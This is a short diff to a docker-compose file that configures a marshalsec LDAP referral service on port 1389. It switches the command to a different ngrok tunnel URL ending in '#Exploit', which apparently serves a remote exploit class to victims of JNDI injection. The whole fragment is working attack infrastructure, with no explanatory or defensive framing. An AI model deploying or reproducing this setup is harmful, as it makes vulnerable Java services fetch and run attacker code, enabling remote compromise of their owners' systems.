@@ -4,7 +4,7 @@ services:
     build:
       context: .
       dockerfile: Dockerfile.marshalsec
-    command: "http://0.tcp.eu.ngrok.io:13844/#Exploit"
+    command: "http://2.tcp.eu.ngrok.io:19961/#Exploit"
     ports: 
       - 1389:1389
     depends_on:
